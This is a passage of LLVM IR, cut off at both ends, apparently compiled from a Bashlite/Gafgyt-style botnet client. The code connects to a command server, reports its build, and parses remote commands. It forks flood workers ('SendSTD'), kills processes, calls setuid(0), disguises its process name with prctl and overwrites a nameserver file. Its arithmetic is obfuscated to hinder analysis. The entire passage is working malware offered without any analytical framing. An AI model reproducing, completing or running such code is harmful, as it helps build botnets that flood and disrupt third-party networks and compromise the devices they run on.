; <label>:536:                                    ; preds = %530
  %537 = load i32, i32* %3, align 4
  %538 = icmp slt i32 %537, 4
  br i1 %538, label %551, label %539

; <label>:539:                                    ; preds = %536
  %540 = load i8**, i8*** %4, align 8
  %541 = getelementptr inbounds i8*, i8** %540, i64 2
  %542 = load i8*, i8** %541, align 8
  %543 = call i32 @atoi(i8* %542) #9
  %544 = icmp slt i32 %543, 1
  br i1 %544, label %551, label %545

; <label>:545:                                    ; preds = %539
  %546 = load i8**, i8*** %4, align 8
  %547 = getelementptr inbounds i8*, i8** %546, i64 3
  %548 = load i8*, i8** %547, align 8
  %549 = call i32 @atoi(i8* %548) #9
  %550 = icmp slt i32 %549, 1
  br i1 %550, label %551, label %552

; <label>:551:                                    ; preds = %545, %539, %536
  br label %659

; <label>:552:                                    ; preds = %545
  %553 = load i8**, i8*** %4, align 8
  %554 = getelementptr inbounds i8*, i8** %553, i64 1
  %555 = load i8*, i8** %554, align 8
  store i8* %555, i8** %32, align 8
  %556 = load i8**, i8*** %4, align 8
  %557 = getelementptr inbounds i8*, i8** %556, i64 2
  %558 = load i8*, i8** %557, align 8
  %559 = call i32 @atoi(i8* %558) #9
  store i32 %559, i32* %33, align 4
  %560 = load i8**, i8*** %4, align 8
  %561 = getelementptr inbounds i8*, i8** %560, i64 3
  %562 = load i8*, i8** %561, align 8
  %563 = call i32 @atoi(i8* %562) #9
  store i32 %563, i32* %34, align 4
  %564 = load i8*, i8** %32, align 8
  %565 = call i8* @strstr(i8* %564, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #9
  %566 = icmp ne i8* %565, null
  br i1 %566, label %567, label %583

; <label>:567:                                    ; preds = %552
  %568 = load i8*, i8** %32, align 8
  %569 = call i8* @strtok(i8* %568, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %569, i8** %35, align 8
  br label %570

; <label>:570:                                    ; preds = %580, %567
  %571 = load i8*, i8** %35, align 8
  %572 = icmp ne i8* %571, null
  br i1 %572, label %573, label %582

; <label>:573:                                    ; preds = %570
  %574 = call i32 @listFork()
  %575 = icmp ne i32 %574, 0
  br i1 %575, label %580, label %576

; <label>:576:                                    ; preds = %573
  %577 = load i8*, i8** %35, align 8
  %578 = load i32, i32* %33, align 4
  %579 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %577, i32 %578, i32 %579)
  call void @_exit(i32 0) #11
  unreachable

; <label>:580:                                    ; preds = %573
  %581 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.508, i32 0, i32 0)) #5
  store i8* %581, i8** %35, align 8
  br label %570

; <label>:582:                                    ; preds = %570
  br label %591

; <label>:583:                                    ; preds = %552
  %584 = call i32 @listFork()
  %585 = icmp ne i32 %584, 0
  br i1 %585, label %586, label %587

; <label>:586:                                    ; preds = %583
  br label %659

; <label>:587:                                    ; preds = %583
  %588 = load i8*, i8** %32, align 8
  %589 = load i32, i32* %33, align 4
  %590 = load i32, i32* %34, align 4
  call void @SendSTD(i8* %588, i32 %589, i32 %590)
  call void @_exit(i32 0) #11
  unreachable

; <label>:591:                                    ; preds = %582
  br label %592

; <label>:592:                                    ; preds = %591, %530
  %593 = load i8**, i8*** %4, align 8
  %594 = getelementptr inbounds i8*, i8** %593, i64 0
  %595 = load i8*, i8** %594, align 8
  %596 = call i32 @strcmp(i8* %595, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.522, i32 0, i32 0)) #9
  %597 = icmp ne i32 %596, 0
  br i1 %597, label %641, label %598

; <label>:598:                                    ; preds = %592
  store i32 0, i32* %36, align 4
  store i64 0, i64* %37, align 8
  br label %599

; <label>:599:                                    ; preds = %628, %598
  %600 = load i64, i64* %37, align 8
  %601 = load i64, i64* @numpids, align 8
  %602 = icmp ult i64 %600, %601
  br i1 %602, label %603, label %635

; <label>:603:                                    ; preds = %599
  %604 = load i32*, i32** @pids, align 8
  %605 = load i64, i64* %37, align 8
  %606 = getelementptr inbounds i32, i32* %604, i64 %605
  %607 = load i32, i32* %606, align 4
  %608 = icmp ne i32 %607, 0
  br i1 %608, label %609, label %627

; <label>:609:                                    ; preds = %603
  %610 = load i32*, i32** @pids, align 8
  %611 = load i64, i64* %37, align 8
  %612 = getelementptr inbounds i32, i32* %610, i64 %611
  %613 = load i32, i32* %612, align 4
  %614 = call i32 @getpid() #5
  %615 = icmp ne i32 %613, %614
  br i1 %615, label %616, label %627

; <label>:616:                                    ; preds = %609
  %617 = load i32*, i32** @pids, align 8
  %618 = load i64, i64* %37, align 8
  %619 = getelementptr inbounds i32, i32* %617, i64 %618
  %620 = load i32, i32* %619, align 4
  %621 = call i32 @kill(i32 %620, i32 9) #5
  %622 = load i32, i32* %36, align 4
  %623 = sub i32 %622, 886348499
  %624 = add i32 %623, 1
  %625 = add i32 %624, 886348499
  %626 = add nsw i32 %622, 1
  store i32 %625, i32* %36, align 4
  br label %627

; <label>:627:                                    ; preds = %616, %609, %603
  br label %628

; <label>:628:                                    ; preds = %627
  %629 = load i64, i64* %37, align 8
  %630 = sub i64 0, %629
  %631 = sub i64 0, 1
  %632 = add i64 %630, %631
  %633 = sub i64 0, %632
  %634 = add i64 %629, 1
  store i64 %633, i64* %37, align 8
  br label %599

; <label>:635:                                    ; preds = %599
  %636 = load i32, i32* %36, align 4
  %637 = icmp sgt i32 %636, 0
  br i1 %637, label %638, label %639

; <label>:638:                                    ; preds = %635
  br label %640

; <label>:639:                                    ; preds = %635
  br label %640

; <label>:640:                                    ; preds = %639, %638
  br label %641

; <label>:641:                                    ; preds = %640, %592
  %642 = load i8**, i8*** %4, align 8
  %643 = getelementptr inbounds i8*, i8** %642, i64 0
  %644 = load i8*, i8** %643, align 8
  %645 = call i32 @strcmp(i8* %644, i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.523, i32 0, i32 0)) #9
  %646 = icmp ne i32 %645, 0
  br i1 %646, label %648, label %647

; <label>:647:                                    ; preds = %641
  call void @exit(i32 0) #12
  unreachable

; <label>:648:                                    ; preds = %641
  %649 = load i8**, i8*** %4, align 8
  %650 = getelementptr inbounds i8*, i8** %649, i64 0
  %651 = load i8*, i8** %650, align 8
  %652 = call i32 @strcmp(i8* %651, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.524, i32 0, i32 0)) #9
  %653 = icmp ne i32 %652, 0
  br i1 %653, label %659, label %654

; <label>:654:                                    ; preds = %648
  call void @RemoveTempDirs()
  %655 = load i32, i32* @mainCommSock, align 4
  %656 = call i8* @getBuild()
  %657 = call i32 @getEndianness()
  %658 = call i32 (i32, i8*, ...) @sockprintf(i32 %655, i8* getelementptr inbounds ([19 x i8], [19 x i8]* @.str.525, i32 0, i32 0), i8* %656, i32 %657)
  br label %659

; <label>:659:                                    ; preds = %654, %648, %586, %551, %520, %458, %410, %358, %292, %288, %265, %239, %185, %180, %152, %126, %75, %70, %43
  ret void
}

; Function Attrs: nounwind
declare i64 @sysconf(i32) #3

; Function Attrs: nounwind
declare i32 @getpid() #3

; Function Attrs: nounwind
declare i32 @getppid() #3

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #3

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #4

; Function Attrs: nounwind readonly
declare i8* @strstr(i8*, i8*) #4

; Function Attrs: noinline nounwind uwtable
define i32 @getEndianness() #0 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.in_addr, align 4
  %3 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %4 = getelementptr inbounds [4 x i8], [4 x i8]* %3, i64 0, i64 0
  store i8 0, i8* %4, align 4
  %5 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %6 = getelementptr inbounds [4 x i8], [4 x i8]* %5, i64 0, i64 1
  store i8 1, i8* %6, align 1
  %7 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %8 = getelementptr inbounds [4 x i8], [4 x i8]* %7, i64 0, i64 2
  store i8 2, i8* %8, align 2
  %9 = bitcast %struct.in_addr* %2 to [4 x i8]*
  %10 = getelementptr inbounds [4 x i8], [4 x i8]* %9, i64 0, i64 3
  store i8 3, i8* %10, align 1
  %11 = bitcast %struct.in_addr* %2 to i32*
  %12 = load i32, i32* %11, align 4
  switch i32 %12, label %17 [
    i32 66051, label %13
    i32 50462976, label %14
    i32 33751041, label %15
    i32 16777986, label %16
  ]

; <label>:13:                                     ; preds = %0
  store i32 ptrtoint ([11 x i8]* @.str.528 to i32), i32* %1, align 4
  br label %18

; <label>:14:                                     ; preds = %0
  store i32 ptrtoint ([14 x i8]* @.str.529 to i32), i32* %1, align 4
  br label %18

; <label>:15:                                     ; preds = %0
  store i32 ptrtoint ([13 x i8]* @.str.530 to i32), i32* %1, align 4
  br label %18

; <label>:16:                                     ; preds = %0
  store i32 ptrtoint ([16 x i8]* @.str.531 to i32), i32* %1, align 4
  br label %18

; <label>:17:                                     ; preds = %0
  store i32 ptrtoint ([8 x i8]* @.str.532 to i32), i32* %1, align 4
  br label %18

; <label>:18:                                     ; preds = %17, %16, %15, %14, %13
  %19 = load i32, i32* %1, align 4
  ret i32 %19
}

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = alloca i32, align 4
  %2 = alloca [512 x i8], align 16
  %3 = alloca i32, align 4
  %4 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %4, i8 0, i64 512, i32 16, i1 false)
  %5 = load i32, i32* @mainCommSock, align 4
  %6 = icmp ne i32 %5, 0
  br i1 %6, label %7, label %10

; <label>:7:                                      ; preds = %0
  %8 = load i32, i32* @mainCommSock, align 4
  %9 = call i32 @close(i32 %8)
  store i32 0, i32* @mainCommSock, align 4
  br label %10

; <label>:10:                                     ; preds = %7, %0
  %11 = load i32, i32* @currentServer, align 4
  %12 = add i32 %11, 1731793169
  %13 = add i32 %12, 1
  %14 = sub i32 %13, 1731793169
  %15 = add nsw i32 %11, 1
  %16 = sext i32 %14 to i64
  %17 = icmp eq i64 %16, 1
  br i1 %17, label %18, label %19

; <label>:18:                                     ; preds = %10
  store i32 0, i32* @currentServer, align 4
  br label %25

; <label>:19:                                     ; preds = %10
  %20 = load i32, i32* @currentServer, align 4
  %21 = add i32 %20, 741409680
  %22 = add i32 %21, 1
  %23 = sub i32 %22, 741409680
  %24 = add nsw i32 %20, 1
  store i32 %23, i32* @currentServer, align 4
  br label %25

; <label>:25:                                     ; preds = %19, %18
  %26 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %27 = load i32, i32* @currentServer, align 4
  %28 = sext i32 %27 to i64
  %29 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %28
  %30 = load i8*, i8** %29, align 8
  %31 = call i8* @strcpy(i8* %26, i8* %30) #5
  store i32 23, i32* %3, align 4
  %32 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %33 = call i8* @strchr(i8* %32, i32 58) #9
  %34 = icmp ne i8* %33, null
  br i1 %34, label %35, label %42

; <label>:35:                                     ; preds = %25
  %36 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %37 = call i8* @strchr(i8* %36, i32 58) #9
  %38 = getelementptr inbounds i8, i8* %37, i64 1
  %39 = call i32 @atoi(i8* %38) #9
  store i32 %39, i32* %3, align 4
  %40 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %41 = call i8* @strchr(i8* %40, i32 58) #9
  store i8 0, i8* %41, align 1
  br label %42

; <label>:42:                                     ; preds = %35, %25
  %43 = call i32 @socket(i32 2, i32 1, i32 0) #5
  store i32 %43, i32* @mainCommSock, align 4
  %44 = load i32, i32* @mainCommSock, align 4
  %45 = getelementptr inbounds [512 x i8], [512 x i8]* %2, i32 0, i32 0
  %46 = load i32, i32* %3, align 4
  %47 = call i32 @connectTimeout(i32 %44, i8* %45, i32 %46, i32 30)
  %48 = icmp ne i32 %47, 0
  br i1 %48, label %50, label %49

; <label>:49:                                     ; preds = %42
  store i32 1, i32* %1, align 4
  br label %51

; <label>:50:                                     ; preds = %42
  store i32 0, i32* %1, align 4
  br label %51

; <label>:51:                                     ; preds = %50, %49
  %52 = load i32, i32* %1, align 4
  ret i32 %52
}

; Function Attrs: nounwind
declare i8* @strcpy(i8*, i8*) #3

; Function Attrs: nounwind readonly
declare i8* @strchr(i8*, i32) #4

; Function Attrs: noinline nounwind uwtable
define void @UpdateNameSrvs() #0 {
  %1 = alloca i16, align 2
  %2 = alloca i8*, align 8
  %3 = alloca i64, align 8
  %4 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 513)
  %5 = trunc i32 %4 to i16
  store i16 %5, i16* %1, align 2
  %6 = call i32 @access(i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.526, i32 0, i32 0), i32 0) #5
  %7 = icmp ne i32 %6, -1
  br i1 %7, label %8, label %16

; <label>:8:                                      ; preds = %0
  store i8* getelementptr inbounds ([39 x i8], [39 x i8]* @.str.527, i32 0, i32 0), i8** %2, align 8
  %9 = load i8*, i8** %2, align 8
  %10 = call i64 @strlen(i8* %9) #9
  store i64 %10, i64* %3, align 8
  %11 = load i16, i16* %1, align 2
  %12 = zext i16 %11 to i32
  %13 = load i8*, i8** %2, align 8
  %14 = load i64, i64* %3, align 8
  %15 = call i64 @write(i32 %12, i8* %13, i64 %14)
  br label %17

; <label>:16:                                     ; preds = %0
  br label %21

; <label>:17:                                     ; preds = %8
  %18 = load i16, i16* %1, align 2
  %19 = zext i16 %18 to i32
  %20 = call i32 @close(i32 %19)
  br label %21

; <label>:21:                                     ; preds = %17, %16
  ret void
}

declare i32 @open(i8*, i32, ...) #1

; Function Attrs: nounwind
declare i32 @access(i8*, i32) #3

; Function Attrs: noinline nounwind uwtable
define i32 @main(i32, i8**) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = alloca i32, align 4
  %13 = alloca i32*, align 8
  %14 = alloca i32, align 4
  %15 = alloca i8*, align 8
  %16 = alloca i8*, align 8
  %17 = alloca i8*, align 8
  %18 = alloca i8*, align 8
  %19 = alloca [10 x i8*], align 16
  %20 = alloca i32, align 4
  %21 = alloca i8*, align 8
  %22 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i8** %6, align 8
  %23 = load i8**, i8*** %5, align 8
  %24 = getelementptr inbounds i8*, i8** %23, i64 0
  %25 = load i8*, i8** %24, align 8
  %26 = load i8**, i8*** %5, align 8
  %27 = getelementptr inbounds i8*, i8** %26, i64 0
  %28 = load i8*, i8** %27, align 8
  %29 = call i64 @strlen(i8* %28) #9
  %30 = call i8* @strncpy(i8* %25, i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i64 %29) #5
  %31 = load i8**, i8*** %5, align 8
  %32 = getelementptr inbounds i8*, i8** %31, i64 0
  store i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.533, i32 0, i32 0), i8** %32, align 8
  %33 = load i8*, i8** %6, align 8
  %34 = ptrtoint i8* %33 to i64
  %35 = call i32 (i32, i64, i32, i32, i32, ...) bitcast (i32 (...)* @prctl to i32 (i32, i64, i32, i32, i32, ...)*)(i32 15, i64 %34, i32 0, i32 0, i32 0)
  %36 = call i64 @time(i64* null) #5
  %37 = call i32 @getpid() #5
  %38 = sext i32 %37 to i64
  %39 = xor i64 %36, -1
  %40 = and i64 -6796277629208789386, %39
  %41 = xor i64 -6796277629208789386, -1
  %42 = and i64 %36, %41
  %43 = xor i64 %38, -1
  %44 = and i64 %43, -6796277629208789386
  %45 = and i64 %38, %41
  %46 = or i64 %40, %42
  %47 = or i64 %44, %45
  %48 = xor i64 %46, %47
  %49 = xor i64 %36, %38
  %50 = trunc i64 %48 to i32
  call void @srand(i32 %50) #5
  %51 = call i64 @time(i64* null) #5
  %52 = call i32 @getpid() #5
  %53 = sext i32 %52 to i64
  %54 = xor i64 %51, -1
  %55 = and i64 %53, %54
  %56 = xor i64 %53, -1
  %57 = and i64 %51, %56
  %58 = or i64 %55, %57
  %59 = xor i64 %51, %53
  %60 = trunc i64 %58 to i32
  call void @init_rand(i32 %60)
  %61 = call i32 @fork() #5
  store i32 %61, i32* %7, align 4
  %62 = icmp ne i32 %61, 0
  br i1 %62, label %63, label %66

; <label>:63:                                     ; preds = %2
  %64 = load i32, i32* %7, align 4
  %65 = call i32 @waitpid(i32 %64, i32* %9, i32 0)
  call void @exit(i32 0) #12
  unreachable

; <label>:66:                                     ; preds = %2
  %67 = load i32, i32* %7, align 4
  %68 = icmp ne i32 %67, 0
  br i1 %68, label %80, label %69

; <label>:69:                                     ; preds = %66
  %70 = call i32 @fork() #5
  store i32 %70, i32* %8, align 4
  %71 = icmp ne i32 %70, 0
  br i1 %71, label %72, label %73

; <label>:72:                                     ; preds = %69
  call void @exit(i32 0) #12
  unreachable

; <label>:73:                                     ; preds = %69
  %74 = load i32, i32* %8, align 4
  %75 = icmp ne i32 %74, 0
  br i1 %75, label %77, label %76

; <label>:76:                                     ; preds = %73
  br label %78

; <label>:77:                                     ; preds = %73
  br label %78

; <label>:78:                                     ; preds = %77, %76
  br label %79

; <label>:79:                                     ; preds = %78
  br label %81

; <label>:80:                                     ; preds = %66
  br label %81

; <label>:81:                                     ; preds = %80, %79
  br label %82

; <label>:82:                                     ; preds = %81
  %83 = call i32 @chdir(i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.534, i32 0, i32 0)) #5
  %84 = call i32 @setuid(i32 0) #5
  %85 = call i32 @seteuid(i32 0) #5
  %86 = call void (i32)* @signal(i32 13, void (i32)* inttoptr (i64 1 to void (i32)*)) #5
  br label %87

; <label>:87:                                     ; preds = %93, %82
  %88 = call i32 @fork() #5
  %89 = icmp eq i32 %88, 0
  br i1 %89, label %90, label %401

; <label>:90:                                     ; preds = %87
  %91 = call i32 @initConnection()
  %92 = icmp ne i32 %91, 0
  br i1 %92, label %93, label %95

; <label>:93:                                     ; preds = %90
  %94 = call i32 @sleep(i32 5)
  br label %87

; <label>:95:                                     ; preds = %90
  %96 = load i32, i32* @mainCommSock, align 4
  %97 = call i8* @getBuild()
  %98 = call i32 @getEndianness()
  %99 = call i32 (i32, i8*, ...) @sockprintf(i32 %96, i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.535, i32 0, i32 0), i8* %97, i32 %98)
  call void @UpdateNameSrvs()
  call void @RemoveTempDirs()
  store i32 0, i32* %11, align 4
  store i32 0, i32* %12, align 4
  br label %100

; <label>:100:                                    ; preds = %399, %251, %215, %95
  %101 = load i32, i32* @mainCommSock, align 4
  %102 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %103 = call i32 @recvLine(i32 %101, i8* %102, i32 4096)
  store i32 %103, i32* %11, align 4
  %104 = icmp ne i32 %103, -1
  br i1 %104, label %105, label %400

; <label>:105:                                    ; preds = %100
  store i32 0, i32* %12, align 4
  br label %106

; <label>:106:                                    ; preds = %199, %105
  %107 = load i32, i32* %12, align 4
  %108 = sext i32 %107 to i64
  %109 = load i64, i64* @numpids, align 8
  %110 = icmp ult i64 %108, %109
  br i1 %110, label %111, label %206

; <label>:111:                                    ; preds = %106
  %112 = load i32*, i32** @pids, align 8
  %113 = load i32, i32* %12, align 4
  %114 = sext i32 %113 to i64
  %115 = getelementptr inbounds i32, i32* %112, i64 %114
  %116 = load i32, i32* %115, align 4
  %117 = call i32 @waitpid(i32 %116, i32* null, i32 1)
  %118 = icmp sgt i32 %117, 0
  br i1 %118, label %119, label %198

; <label>:119:                                    ; preds = %111
  %120 = load i32, i32* %12, align 4
  %121 = sub i32 0, %120
  %122 = sub i32 0, 1
  %123 = add i32 %121, %122
  %124 = sub i32 0, %123
  %125 = add nsw i32 %120, 1
  store i32 %124, i32* %14, align 4
  br label %126

; <label>:126:                                    ; preds = %144, %119
  %127 = load i32, i32* %14, align 4
  %128 = zext i32 %127 to i64
  %129 = load i64, i64* @numpids, align 8
  %130 = icmp ult i64 %128, %129
  br i1 %130, label %131, label %150

; <label>:131:                                    ; preds = %126
  %132 = load i32*, i32** @pids, align 8
  %133 = load i32, i32* %14, align 4
  %134 = zext i32 %133 to i64
  %135 = getelementptr inbounds i32, i32* %132, i64 %134
  %136 = load i32, i32* %135, align 4
  %137 = load i32*, i32** @pids, align 8
  %138 = load i32, i32* %14, align 4
  %139 = sub i32 0, 1
  %140 = add i32 %138, %139
  %141 = sub i32 %138, 1
  %142 = zext i32 %140 to i64
  %143 = getelementptr inbounds i32, i32* %137, i64 %142
  store i32 %136, i32* %143, align 4
  br label %144

; <label>:144:                                    ; preds = %131
  %145 = load i32, i32* %14, align 4
  %146 = add i32 %145, 316954457
  %147 = add i32 %146, 1
  %148 = sub i32 %147, 316954457
  %149 = add i32 %145, 1
  store i32 %148, i32* %14, align 4
  br label %126

; <label>:150:                                    ; preds = %126
  %151 = load i32*, i32** @pids, align 8
  %152 = load i32, i32* %14, align 4
  %153 = add i32 %152, 967141528
  %154 = sub i32 %153, 1
  %155 = sub i32 %154, 967141528
  %156 = sub i32 %152, 1
  %157 = zext i32 %155 to i64
  %158 = getelementptr inbounds i32, i32* %151, i64 %157
  store i32 0, i32* %158, align 4
  %159 = load i64, i64* @numpids, align 8
  %160 = sub i64 %159, 7067581825648334545
  %161 = add i64 %160, -1
  %162 = add i64 %161, 7067581825648334545
  %163 = add i64 %159, -1
  store i64 %162, i64* @numpids, align 8
  %164 = load i64, i64* @numpids, align 8
  %165 = sub i64 %164, 8077939790023055915
  %166 = add i64 %165, 1
  %167 = add i64 %166, 8077939790023055915
  %168 = add i64 %164, 1
  %169 = mul i64 %167, 4
  %170 = call noalias i8* @malloc(i64 %169) #5
  %171 = bitcast i8* %170 to i32*
  store i32* %171, i32** %13, align 8
  store i32 0, i32* %14, align 4
  br label %172

; <label>:172:                                    ; preds = %187, %150
  %173 = load i32, i32* %14, align 4
  %174 = zext i32 %173 to i64
  %175 = load i64, i64* @numpids, align 8
  %176 = icmp ult i64 %174, %175
  br i1 %176, label %177, label %194

; <label>:177:                                    ; preds = %172
  %178 = load i32*, i32** @pids, align 8
  %179 = load i32, i32* %14, align 4
  %180 = zext i32 %179 to i64
  %181 = getelementptr inbounds i32, i32* %178, i64 %180
  %182 = load i32, i32* %181, align 4
  %183 = load i32*, i32** %13, align 8
  %184 = load i32, i32* %14, align 4
  %185 = zext i32 %184 to i64
  %186 = getelementptr inbounds i32, i32* %183, i64 %185
  store i32 %182, i32* %186, align 4
  br label %187

; <label>:187:                                    ; preds = %177
  %188 = load i32, i32* %14, align 4
  %189 = sub i32 0, %188
  %190 = sub i32 0, 1
  %191 = add i32 %189, %190
  %192 = sub i32 0, %191
  %193 = add i32 %188, 1
  store i32 %192, i32* %14, align 4
  br label %172

; <label>:194:                                    ; preds = %172
  %195 = load i32*, i32** @pids, align 8
  %196 = bitcast i32* %195 to i8*
  call void @free(i8* %196) #5
  %197 = load i32*, i32** %13, align 8
  store i32* %197, i32** @pids, align 8
  br label %198

; <label>:198:                                    ; preds = %194, %111
  br label %199

; <label>:199:                                    ; preds = %198
  %200 = load i32, i32* %12, align 4
  %201 = sub i32 0, %200
  %202 = sub i32 0, 1
  %203 = add i32 %201, %202
  %204 = sub i32 0, %203
  %205 = add nsw i32 %200, 1
  store i32 %204, i32* %12, align 4
  br label %106

; <label>:206:                                    ; preds = %106
  %207 = load i32, i32* %11, align 4
  %208 = sext i32 %207 to i64
  %209 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i64 0, i64 %208
  store i8 0, i8* %209, align 1
  %210 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @trim(i8* %210)
  %211 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %212 = call i8* @strstr(i8* %211, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.510, i32 0, i32 0)) #9
  %213 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %214 = icmp eq i8* %212, %213
  br i1 %214, label %215, label %216

; <label>:215:                                    ; preds = %206
  br label %100

; <label>:216:                                    ; preds = %206
  %217 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %218 = call i8* @strstr(i8* %217, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.536, i32 0, i32 0)) #9
  %219 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %220 = icmp eq i8* %218, %219
  br i1 %220, label %221, label %222

; <label>:221:                                    ; preds = %216
  call void @exit(i32 0) #12
  unreachable

; <label>:222:                                    ; preds = %216
  %223 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  store i8* %223, i8** %15, align 8
  %224 = load i8*, i8** %15, align 8
  %225 = load i8, i8* %224, align 1
  %226 = zext i8 %225 to i32
  %227 = icmp eq i32 %226, 33
  br i1 %227, label %228, label %399

; <label>:228:                                    ; preds = %222
  %229 = load i8*, i8** %15, align 8
  %230 = getelementptr inbounds i8, i8* %229, i64 1
  store i8* %230, i8** %16, align 8
  br label %231

; <label>:231:                                    ; preds = %243, %228
  %232 = load i8*, i8** %16, align 8
  %233 = load i8, i8* %232, align 1
  %234 = zext i8 %233 to i32
  %235 = icmp ne i32 %234, 32
  br i1 %235, label %236, label %241

; <label>:236:                                    ; preds = %231
  %237 = load i8*, i8** %16, align 8
  %238 = load i8, i8* %237, align 1
  %239 = zext i8 %238 to i32
  %240 = icmp ne i32 %239, 0
  br label %241

; <label>:241:                                    ; preds = %236, %231
  %242 = phi i1 [ false, %231 ], [ %240, %236 ]
  br i1 %242, label %243, label %246

; <label>:243:                                    ; preds = %241
  %244 = load i8*, i8** %16, align 8
  %245 = getelementptr inbounds i8, i8* %244, i32 1
  store i8* %245, i8** %16, align 8
  br label %231

; <label>:246:                                    ; preds = %241
  %247 = load i8*, i8** %16, align 8
  %248 = load i8, i8* %247, align 1
  %249 = zext i8 %248 to i32
  %250 = icmp eq i32 %249, 0
  br i1 %250, label %251, label %252

; <label>:251:                                    ; preds = %246
  br label %100

; <label>:252:                                    ; preds = %246
  %253 = load i8*, i8** %16, align 8
  store i8 0, i8* %253, align 1
  %254 = load i8*, i8** %15, align 8
  %255 = getelementptr inbounds i8, i8* %254, i64 1
  store i8* %255, i8** %16, align 8
  %256 = load i8*, i8** %15, align 8
  %257 = load i8*, i8** %16, align 8
  %258 = call i64 @strlen(i8* %257) #9
  %259 = getelementptr inbounds i8, i8* %256, i64 %258
  %260 = getelementptr inbounds i8, i8* %259, i64 2
  store i8* %260, i8** %15, align 8
  br label %261

; <label>:261:                                    ; preds = %286, %252
  %262 = load i8*, i8** %15, align 8
  %263 = load i8*, i8** %15, align 8
  %264 = call i64 @strlen(i8* %263) #9
  %265 = sub i64 0, 1
  %266 = add i64 %264, %265
  %267 = sub i64 %264, 1
  %268 = getelementptr inbounds i8, i8* %262, i64 %266
  %269 = load i8, i8* %268, align 1
  %270 = zext i8 %269 to i32
  %271 = icmp eq i32 %270, 10
  br i1 %271, label %284, label %272

; <label>:272:                                    ; preds = %261
  %273 = load i8*, i8** %15, align 8
  %274 = load i8*, i8** %15, align 8
  %275 = call i64 @strlen(i8* %274) #9
  %276 = sub i64 %275, -5336199189161769153
  %277 = sub i64 %276, 1
  %278 = add i64 %277, -5336199189161769153
  %279 = sub i64 %275, 1
  %280 = getelementptr inbounds i8, i8* %273, i64 %278
  %281 = load i8, i8* %280, align 1
  %282 = zext i8 %281 to i32
  %283 = icmp eq i32 %282, 13
  br label %284

; <label>:284:                                    ; preds = %272, %261
  %285 = phi i1 [ true, %261 ], [ %283, %272 ]
  br i1 %285, label %286, label %295

; <label>:286:                                    ; preds = %284
  %287 = load i8*, i8** %15, align 8
  %288 = load i8*, i8** %15, align 8
  %289 = call i64 @strlen(i8* %288) #9
  %290 = sub i64 %289, -2869534053609735362
  %291 = sub i64 %290, 1
  %292 = add i64 %291, -2869534053609735362
  %293 = sub i64 %289, 1
  %294 = getelementptr inbounds i8, i8* %287, i64 %292
  store i8 0, i8* %294, align 1
  br label %261

; <label>:295:                                    ; preds = %284
  %296 = load i8*, i8** %15, align 8
  store i8* %296, i8** %17, align 8
  br label %297

; <label>:297:                                    ; preds = %309, %295
  %298 = load i8*, i8** %15, align 8
  %299 = load i8, i8* %298, align 1
  %300 = zext i8 %299 to i32
  %301 = icmp ne i32 %300, 32
  br i1 %301, label %302, label %307

; <label>:302:                                    ; preds = %297
  %303 = load i8*, i8** %15, align 8
  %304 = load i8, i8* %303, align 1
  %305 = zext i8 %304 to i32
  %306 = icmp ne i32 %305, 0
  br label %307

; <label>:307:                                    ; preds = %302, %297
  %308 = phi i1 [ false, %297 ], [ %306, %302 ]
  br i1 %308, label %309, label %312

; <label>:309:                                    ; preds = %307
  %310 = load i8*, i8** %15, align 8
  %311 = getelementptr inbounds i8, i8* %310, i32 1
  store i8* %311, i8** %15, align 8
  br label %297

; <label>:312:                                    ; preds = %307
  %313 = load i8*, i8** %15, align 8
  store i8 0, i8* %313, align 1
  %314 = load i8*, i8** %15, align 8
